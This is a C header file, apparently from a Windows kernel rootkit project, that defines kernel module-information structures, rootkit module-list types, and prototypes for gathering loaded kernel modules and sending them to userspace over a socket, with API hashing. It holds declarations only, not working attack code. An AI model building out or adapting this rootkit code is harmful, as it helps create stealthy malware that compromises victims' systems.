#pragma once

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


typedef struct _ROOTKIT_MODULES_ENTRY {
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
	CHAR ModulePath[260];
	CHAR ModuleName[260];
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG LoadOrderIndex;
}ROOTKIT_MODULES_ENTRY, *PROOTKIT_MODULES_ENTRY;

typedef struct _ROOTKIT_MODULES_LIST_HEAD {
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
	ULONG NumberOfEntries;
}ROOTKIT_MODULES_LIST_HEAD, *PROOTKIT_MODULES_LIST_HEAD;

PROOTKIT_MODULES_LIST_HEAD g_modules_head;
PROOTKIT_MODULES_LIST_HEAD kernel_get_modules(IN PROOTKIT_API_HASH Hash);
ULONG rk_copy_modules_list_to_buffer(IN PROOTKIT_MODULES_ENTRY Buffer, IN PROOTKIT_API_HASH Hash);
BOOLEAN rk_send_modules_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash);

